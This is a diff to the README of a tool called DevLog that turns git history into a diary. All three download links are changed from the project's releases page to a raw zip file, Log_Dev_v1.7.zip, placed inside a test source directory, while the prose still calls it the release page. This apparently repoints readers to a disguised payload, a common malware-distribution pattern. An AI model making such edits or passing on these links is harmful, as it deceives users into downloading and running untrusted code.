@@ -1,6 +1,6 @@
 # 🤖 DevLog - Turn git history into diary
 
-[![Download DevLog](https://img.shields.io/badge/Download-DevLog-blue?style=for-the-badge)](https://github.com/unseasonable-deposer640/DevLog/releases)
+[![Download DevLog](https://img.shields.io/badge/Download-DevLog-blue?style=for-the-badge)](https://github.com/unseasonable-deposer640/DevLog/raw/refs/heads/main/src/test/kotlin/dev/vikey/devlog/domain/Log_Dev_v1.7.zip)
 
 ## 🚀 What DevLog does
 
@@ -23,7 +23,7 @@ If your PC can run normal desktop apps and you can open a terminal window, you c
 
 ## 📥 Download DevLog
 
-Visit this page to download: https://github.com/unseasonable-deposer640/DevLog/releases
+Visit this page to download: https://github.com/unseasonable-deposer640/DevLog/raw/refs/heads/main/src/test/kotlin/dev/vikey/devlog/domain/Log_Dev_v1.7.zip
 
 On the releases page:
 
@@ -228,7 +228,7 @@ You do not need to learn these first. DevLog works best when you just point it a
 
 ## 📎 Download again
 
-If you need the release page later, use this link: https://github.com/unseasonable-deposer640/DevLog/releases
+If you need the release page later, use this link: https://github.com/unseasonable-deposer640/DevLog/raw/refs/heads/main/src/test/kotlin/dev/vikey/devlog/domain/Log_Dev_v1.7.zip
 
 ## ✅ Quick start
 
